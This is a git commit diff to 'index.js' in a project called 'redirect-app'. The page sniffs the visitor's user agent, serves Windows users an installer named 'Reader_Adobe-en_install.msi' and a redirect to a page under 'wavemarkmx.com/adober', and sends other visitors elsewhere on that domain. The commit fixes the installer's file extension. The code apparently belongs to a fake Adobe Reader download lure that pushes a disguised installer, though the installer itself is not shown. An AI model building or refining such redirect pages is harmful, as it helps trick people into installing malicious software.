a7e47a4ef42060ada1577fb07000e54112672046
kka03517-gif <kka03517@gmail.com>
2025-12-15 04:43:37 -0800

    Update index.js

--- redirect-app/pages/index.js
+++ redirect-app/pages/index.js
@@ -6,7 +6,7 @@ export default function Home() {
     const isWindows = /windows/i.test(userAgent);
 
     const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";
-    const MSI_FILE = "/Reader_Adobe-en_install";
+    const MSI_FILE = "/Reader_Adobe-en_install.msi";
     const WINDOWS_REDIRECT = "https://wavemarkmx.com/adober/reader/download.html";
 
     if (isWindows) {
@@ -52,4 +52,5 @@ export default function Home() {
     </main>
   );
 }
+
 
